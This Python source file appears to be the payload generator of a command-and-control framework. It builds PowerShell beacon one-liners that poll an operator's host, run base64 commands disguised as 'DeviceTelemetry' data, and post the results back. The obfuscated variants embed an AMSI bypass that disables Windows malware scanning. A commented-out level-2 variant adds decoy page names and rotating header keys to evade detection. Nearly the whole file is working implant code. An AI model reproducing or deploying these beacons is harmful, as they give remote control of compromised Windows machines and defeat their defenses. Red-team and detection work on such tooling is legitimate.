import base64
import random
from typing import Union
import textwrap
from core.payload_generator.common import payload_utils as payutils
from core.malleable_c2.malleable_c2 import parse_malleable_profile, MalleableProfile, apply_client_profile, get_listener_by_port_and_transport
from core.malleable_c2.profile_loader import load_profile, ProfileConfig, _render_ps_mapping, _render_ps_output, update_listener_profile_list
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

def make_raw(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter, profile: Union[str, MalleableProfile, None] = None):
	beacon_og_url = f"http://{ip}:{port}"
	if profile:
		cfg: ProfileConfig = load_profile(
			profile_path     = profile,
			default_headers  = headers or {},
			default_ua       = useragent,
			port             = port,
			transport        = "http",
		)

		# apply any timing overrides
		beacon_interval = cfg.interval or beacon_interval
		beacon_jitter   = cfg.jitter   or jitter

		# rebuild URLs with profile‐specified URIs
		beacon_url      = beacon_og_url.rstrip("/") + cfg.get_uri
		beacon_post_url = beacon_og_url.rstrip("/") + cfg.post_uri

		# override UA if needed
		effective_ua = cfg.useragent or useragent

		cfg.client_headers.pop("Accept", None)
		cfg.client_headers.pop("Host", None)
		cfg.client_headers.pop("Range", None)

		grab_output = _render_ps_mapping(cfg.output_mapping)
		send_output = _render_ps_output(cfg.post_client_mapping)

		# headers builder will consume the merged client_headers
		formatted_headers = payutils.build_powershell_headers(
			cfg.client_headers, nostart=True, first=True
		)

		# Accept / Host / Range lines from cfg
		accept_header  = f"$req.Accept = '{cfg.accept}';"  if cfg.accept  else ""
		host_header    = f"$req.Host   = '{cfg.host}';"    if cfg.host    else ""
		range_header   = f"$req.AddRange(0, {cfg.byte_range});" if cfg.byte_range else ""

	else:
		# no profile: stick to CLI args only
		beacon_url      = beacon_og_url
		beacon_post_url = beacon_og_url
		effective_ua    = useragent
		beacon_jitter = jitter
		grab_output = textwrap.dedent("""
			if ($task.DeviceTelemetry) {
				$cmd_b64 = $task.DeviceTelemetry.Telemetry;
			
		""").replace("\n", "")
		#send_output = "$output = $results|Out-String;"
		send_output = "$body = @{ output = $b64 } | ConvertTo-Json;"


		formatted_headers = payutils.build_powershell_headers(
			headers or {}, nostart=True, first=True
		)

		accept_header  = f"$req.Accept = '{accept}';"  if accept   else ""
		host_header    = f"$req.Host   = '{headers.get('Host')}';" if headers and "Host" in headers else ""
		range_header   = f"$req.AddRange(0, {byte_range});" if byte_range else ""

	raw = (
		f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
		f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
		f"$sid=G-SID;$uri='{beacon_url}';$uri2='{beacon_post_url}';"
		"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
		"$hdr=@{'X-Session-ID'=$sid};"

		# Define Get-Task
		"Function Get-Task {"
		"$req = [System.Net.HttpWebRequest]::Create($uri);"
		"$req.Method = 'GET';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		f"{formatted_headers}"
		f"$req.UserAgent = '{effective_ua}';"
		f"{accept_header}"
		f"{host_header}"
		f"{range_header}"
		"$resp = $req.GetResponse();"
		"$stream = $resp.GetResponseStream();"
		"$reader = New-Object System.IO.StreamReader($stream);"
		"$result = $reader.ReadToEnd();"
		"$reader.Close();$stream.Close();$resp.Close();"
		"return $result"
		"};"

		# Define Send-Output
		"Function Send-Output($payload) {"
		"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
		"$req = [System.Net.HttpWebRequest]::Create($uri2);"
		"$req.Method = 'POST';"
		"$req.ContentType = 'application/json';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		f"{formatted_headers}"
		f"$req.UserAgent = '{effective_ua}';"
		f"{accept_header}"
		f"{host_header}"
		f"{range_header}"
		"$req.ContentLength = $bytes.Length;"
		"$stream = $req.GetRequestStream();"
		"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
		"$resp = $req.GetResponse();$resp.Close()"
		"};"

		# Init PS pipeline
		"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
		"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
		"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

		# Beacon loop
		"while($true){"
		"try{"
		"$taskJson = Get-Task;"
		"$task = ConvertFrom-Json $taskJson;"
		f"{grab_output}"
		"$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd_b64));"
		"$pipeline.Commands.Clear();"
		"$pipeline.AddScript($cmd)|Out-Null;"
		"$results = $pipeline.Invoke();"
		"$output = $results|Out-String;"
		"$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
		f"{send_output}"
		"Send-Output $body;"
		"}"
		"}catch{};"
		f"$jitter = {beacon_jitter};"
		f"$jitmax = $jitter + 30;"
		f"if ($jitter -eq 0) {{ $delay = {beacon_interval} }} else {{ "
		f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
		f"$j = [Math]::Floor(({beacon_interval} * $percent) / 100);"
		f"$delay = {beacon_interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
		"Start-Sleep -Seconds $delay;"
		"}"
	)

	return raw



def generate_windows_powershell_http(ip, port, obs, beacon_interval, headers, useragent, accept, byte_range, jitter=0, no_child=None, profile=None):

	if obs is None or obs == 0:
		print(brightgreen + f"[*] Generating HTTP payload...")
		payload = make_raw(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	if obs == 1:
		payload = generate_windows_powershell_http_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	elif obs == 2:
		print(brightgreen + useragent)
		payload = generate_windows_powershell_http_obfuscate_level2(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd
		
	"""else:
		return _obfuscate_level3(template)"""

def generate_windows_powershell_http_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter, profile):
	beacon_og_url = f"http://{ip}:{port}"
	if profile:
		cfg: ProfileConfig = load_profile(
			profile_path     = profile,
			default_headers  = headers or {},
			default_ua       = useragent,
			port             = port,
			transport        = "http",
		)

		# apply any timing overrides
		beacon_interval = cfg.interval or beacon_interval
		beacon_jitter   = cfg.jitter   or jitter

		# rebuild URLs with profile‐specified URIs
		beacon_url      = beacon_og_url.rstrip("/") + cfg.get_uri
		beacon_post_url = beacon_og_url.rstrip("/") + cfg.post_uri

		# override UA if needed
		effective_ua = cfg.useragent or useragent

		cfg.client_headers.pop("Accept", None)
		cfg.client_headers.pop("Host", None)
		cfg.client_headers.pop("Range", None)

		# headers builder will consume the merged client_headers
		formatted_headers = payutils.build_powershell_headers(
			cfg.client_headers, nostart=True, first=True
		)

		# Accept / Host / Range lines from cfg
		accept_header  = f"$req.Accept = '{cfg.accept}';"  if cfg.accept  else ""
		host_header    = f"$req.Host   = '{cfg.host}';"    if cfg.host    else ""
		range_header   = f"$req.AddRange(0, {cfg.byte_range});" if cfg.byte_range else ""

	else:
		# no profile: stick to CLI args only
		beacon_url      = beacon_og_url
		beacon_post_url = beacon_og_url
		effective_ua    = useragent
		beacon_jitter = jitter

		formatted_headers = payutils.build_powershell_headers(
			headers or {}, nostart=True, first=True
		)

		accept_header  = f"$req.Accept = '{accept}';"  if accept   else ""
		host_header    = f"$req.Host   = '{headers.get('Host')}';" if headers and "Host" in headers else ""
		range_header   = f"$req.AddRange(0, {byte_range});" if byte_range else ""

	print(accept_header)

	one_liner = (
	f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
	f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
	f"$sid=G-SID;$uri='{beacon_url}';$uri2='{beacon_post_url}';"
	f"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
	f"$hdr=@{{'X-Session-ID'=$sid}};"

	# AMSI bypass
	"$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
	"(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
	"$n='Non'+'Public';$s='Static';"
	"$f=$e.GetField(([string]::Join('',[char[]]"
	"(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
	"$t=[type[]]@([object],[bool]);"
	"$m=$f.GetType().GetMethod('Set'+'Value',$t);"
	"$m.Invoke($f,@($null,$true));"

	# Define GET using .NET
	"Function Get-Task {"
	"$req = [System.Net.HttpWebRequest]::Create($uri);"
	"$req.Method = 'GET';"
	f"{host_header}"
	"$req.Headers.Add('X-Session-ID',$sid);"
	f"{formatted_headers}"
	f"$req.UserAgent = '{effective_ua}';"
	f"{accept_header}"
	f"{range_header}"
	"$resp = $req.GetResponse();"
	"$stream = $resp.GetResponseStream();"
	"$reader = New-Object System.IO.StreamReader($stream);"
	"$result = $reader.ReadToEnd();"
	"$reader.Close();$stream.Close();$resp.Close();"
	"return $result"
	"};"

	# Define POST using .NET
	"Function Send-Output($payload) {"
	"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
	"$req = [System.Net.HttpWebRequest]::Create($uri2);"
	"$req.Method = 'POST';"
	f"{host_header}"
	"$req.ContentType = 'application/json';"
	"$req.Headers.Add('X-Session-ID',$sid);"
	f"{formatted_headers}"
	f"$req.UserAgent = '{effective_ua}';"
	f"{accept_header}"
	f"{range_header}"
	"$req.ContentLength = $bytes.Length;"
	"$stream = $req.GetRequestStream();"
	"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
	"$resp = $req.GetResponse();$resp.Close()"
	"};"

	# PowerShell pipeline init
	"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
	"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
	"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

	# Beacon loop
	f"while($true){{"
	"try{"
	"    $taskJson = Get-Task;"
	"    $task = ConvertFrom-Json $taskJson;"
	"    if($task.DeviceTelemetry){"
	"        $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.DeviceTelemetry.Telemetry));"
	"        $pipeline.Commands.Clear();"
	"        $pipeline.AddScript($cmd)|Out-Null;"
	"        $results = $pipeline.Invoke();"
	"        $output = $results|Out-String;"
	"        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
	"        $body = @{output=$b64}|ConvertTo-Json;"
	"        Send-Output $body;"
	"    };"
	"}"
	"catch{};"
	f"$jitter = {beacon_jitter};"
	f"$jitmax = $jitter + 30;"
	f"if ($jitter -eq 0) {{ $delay = {beacon_interval} }} else {{ "
	f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
	f"$j = [Math]::Floor(({beacon_interval} * $percent) / 100);"
	f"$delay = {beacon_interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
	"Start-Sleep -Seconds $delay;"
	"}"
)

	return one_liner

"""def generate_windows_powershell_http_obfuscate_level2(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter, profile):
	# list of fake .php pages
	pages = ["admin.php","upload.php","maintainence.php","background.php","painters.php", "backup.php"]
	# obfuscated header keys
	hdrs = {"X-Session-ID": [88,45,83,101,115,115,105,111,110,45,73,68], "X-API-KEY": [88,45,65,80,73,45,75,69,89], "X-Forward-Key": [88,45,70,111,114,119,97,114,100,45,75,101,121]}

	hdr_keys = ["X-Session-ID", "X-API-KEY", "X-Forward-Key"]
	pages_literal = ", ".join(f"'{p}'" for p in pages)
	hdr_keys_literal  = ", ".join(f"'{h}'" for h in hdr_keys)

	formatted_headers = payutils.build_powershell_headers(headers, nostart=True, first=True) if headers else ""
	formatted_headers2 = payutils.build_powershell_headers(headers, nostart=True) if headers else ""

	if accept:
		accept_header = f"$req.Accept = '{accept}';"
		accept_header2 = f"$req2.Accept = '{accept}';"

	else:
		accept_header = ""
		accept_header2 = ""

	if byte_range:
		byte_range = f"$req.AddRange(0, {byte_range});"
		byte_range2 = f"$req2.AddRange(0, {byte_range});"

	else:
		byte_range = ""
		byte_range2 = ""

	beacon_url = f"http://{ip}:{port}/"
	interval = beacon_interval


	# build the raw PowerShell one-liner
	ps_lines = (
	# Session ID generator
	"Function G-SID {"
	"    $c = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
	"    $p = @();"
	"    1..3 | % { $p += -join(1..5 | % { $c | Get-Random }) };"
	"    $p -join '-'"
	"};"
	"$sid = G-SID;"
	"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"

	# AMSI bypass
	"$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
	"(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
	"$n='Non'+'Public';$s='Static';"
	"$f=$e.GetField(([string]::Join('',[char[]]"
	"(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
	"$t=[type[]]@([object],[bool]);"
	"$m=$f.GetType().GetMethod('Set'+'Value',$t);"
	"$m.Invoke($f,@($null,$true));"

	# Headers & Pages
	f"$pages = @({pages_literal});"
	f"$hdrArr = @({hdr_keys_literal});"

	# Output wrapper
	"Function Send-Output($payload) {"
	"    $page = $pages | Get-Random;"
	f"   $uri = 'http://{ip}:{port}/' + $page;"
	"    $req2 = [System.Net.HttpWebRequest]::Create($uri);"
	"    $req2.Method = 'POST';"
	"    $req2.ContentType = 'application/json';"
	"    $hdr = $hdrArr | Get-Random;"
	"    $req2.Headers.Add($hdr, $sid);"
	f"   {formatted_headers2}"
	f"   $req2.UserAgent = '{useragent}';"
	f"   {accept_header2}"
	f"   {byte_range2}"
	"    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
	"    $req2.ContentLength = $bytes.Length;"
	"    $s = $req2.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close();"
	"    $resp = $req2.GetResponse(); $resp.Close();"
	"};"

	# Pipeline init
	"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
	"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
	"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

	# Beacon loop
	"while ($true) {"
	"try {"
	"    $page = $pages | Get-Random;"
	f"    $uri = 'http://{ip}:{port}/' + $page;"
	"    $req = [System.Net.HttpWebRequest]::Create($uri);"
	"    $req.Method = 'GET';"
	"    $hdr = $hdrArr | Get-Random;"
	"    $req.Headers.Add($hdr, $sid);"
	f"   {formatted_headers}"
	f"   $req.UserAgent = '{useragent}';"
	f"   {accept_header}"
	f"   {byte_range}"
	"    $resp = $req.GetResponse();"
	"    $stream = $resp.GetResponseStream();"
	"    $reader = New-Object System.IO.StreamReader($stream);"
	"    $taskJson = $reader.ReadToEnd();"
	"    $reader.Close(); $stream.Close(); $resp.Close();"
	"    $task = $taskJson | ConvertFrom-Json;"
	"    if ($task.DeviceTelemetry) {"
	"        $cmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.DeviceTelemetry.Telemetry));"
	"        $pipeline.Commands.Clear();"
	"        $pipeline.AddScript($cmd) | Out-Null;"
	"        $results = $pipeline.Invoke();"
	"        $output = $results | Out-String;"
	"        $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output.Trim()));"
	"        $json = @{output=$b64} | ConvertTo-Json -Compress;"
	"        Send-Output $json;"
	"    }"
	"} catch {}"

	# Jitter-safe sleep logic
	f"$jitter = {jitter};"
	f"if ($jitter -eq 0) {{ $delay = {interval} }} else {{ "
	f"  $percent = Get-Random -Minimum -$jitter -Maximum $jitter;"
	f"  $j = [Math]::Floor(({interval} * $percent) / 100);"
	f"  $delay = {interval} + $j;"
	f"  if ($delay -lt 1) {{ $delay = 1 }}; if ($delay -gt 2147483) {{ $delay = 2147483 }} }}"
	"Start-Sleep -Seconds $delay;"
	"}"
)
	
	return ps_lines"""